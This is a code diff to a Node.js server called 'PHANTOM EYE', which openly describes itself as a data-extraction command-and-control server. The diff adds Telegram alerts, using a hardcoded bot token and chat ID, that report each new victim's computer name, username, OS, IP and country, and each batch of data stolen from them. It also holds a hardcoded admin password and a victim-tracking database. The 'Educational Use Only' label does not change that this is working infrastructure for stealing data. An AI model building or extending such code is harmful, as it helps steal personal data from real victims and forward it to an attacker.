@@ -1,5 +1,6 @@
 // ================================================
 // PHANTOM EYE - Advanced Data Extraction C2 Server
+// With Telegram Notifications
 // Educational Use Only
 // ================================================
 
@@ -13,9 +14,10 @@ const cors = require('cors');
 const { v4: uuidv4 } = require('uuid');
 const jwt = require('jsonwebtoken');
 const bcrypt = require('bcryptjs');
+const axios = require('axios');
 
 // ================================================
-// CONFIGURATION
+// CONFIGURATION - EDIT THESE!
 // ================================================
 const CONFIG = {
     server: {
@@ -25,6 +27,10 @@ const CONFIG = {
     admin: {
         username: 'admin',
         password: 'Phantom2024!'
+    },
+    telegram: {
+        botToken: '8898422922:AAHKKmTW2mgJyz3lFV7vqtk7T7RjT5qMf78',    // ← GET FROM @BotFather
+        chatId: '7075480337'         // ← GET FROM @userinfobot
     }
 };
 
@@ -125,7 +131,8 @@ class Database {
                         // Update victim data count
                         this.db.run(
                             'UPDATE victims SET data_count = data_count + 1 WHERE victim_id = ?',
-                            [victimId]
+                            [victimId],
+                            () => {}
                         );
                         resolve({ id: this.lastID });
                     }
@@ -191,6 +198,23 @@ class Server {
         this.setupWebSocket();
     }
 
+    // ================================================
+    // TELEGRAM NOTIFICATIONS
+    // ================================================
+    async sendTelegram(message) {
+        try {
+            const url = `https://api.telegram.org/bot${CONFIG.telegram.botToken}/sendMessage`;
+            await axios.post(url, {
+                chat_id: CONFIG.telegram.chatId,
+                text: message,
+                parse_mode: 'HTML'
+            });
+            console.log('📱 Telegram notification sent');
+        } catch (e) {
+            console.log('⚠️ Telegram send failed:', e.message);
+        }
+    }
+
     setupMiddleware() {
         this.app.use(cors());
         this.app.use(express.json({ limit: '50mb' }));
@@ -249,6 +273,19 @@ class Server {
                 const result = await this.db.addVictim(data);
                 this.io.emit('new_victim', { victimId: result.victimId });
 
+                // ===== TELEGRAM NOTIFICATION - NEW VICTIM =====
+                await this.sendTelegram(`
+👁️ <b>NEW VICTIM!</b>
+
+🆔 ID: ${result.victimId}
+💻 Computer: ${data.computer_name || 'Unknown'}
+👤 User: ${data.username || 'Unknown'}
+🌐 OS: ${data.os || 'Unknown'}
+📡 IP: ${data.ip || 'Unknown'}
+🌍 Country: ${data.country || 'Unknown'}
+⏰ Time: ${new Date().toISOString()}
+`);
+
                 res.json({
                     success: true,
                     victimId: result.victimId
@@ -263,6 +300,18 @@ class Server {
                 const { victimId, dataType, data } = req.body;
                 await this.db.saveExtractedData(victimId, dataType, data);
                 this.io.emit('new_data', { victimId, dataType });
+
+                // ===== TELEGRAM NOTIFICATION - NEW DATA =====
+                const dataSize = JSON.stringify(data).length;
+                await this.sendTelegram(`
+📊 <b>NEW DATA RECEIVED!</b>
+
+🆔 Victim: ${victimId}
+📁 Type: ${dataType}
+📦 Size: ${dataSize} bytes
+⏰ Time: ${new Date().toISOString()}
+`);
+
                 res.json({ success: true });
             } catch (e) {
                 res.status(500).json({ error: e.message });
@@ -376,6 +425,7 @@ class Server {
 ║   🌐 CHROME: /chrome                                        ║
 ║                                                               ║
 ║   🔑 Login: admin / Phantom2024!                            ║
+║   📱 Telegram: ${CONFIG.telegram.botToken !== 'YOUR_BOT_TOKEN_HERE' ? '✅ Enabled' : '❌ Disabled (Add Token)'}     ║
 ║                                                               ║
 ╚═══════════════════════════════════════════════════════════════╝
             `);
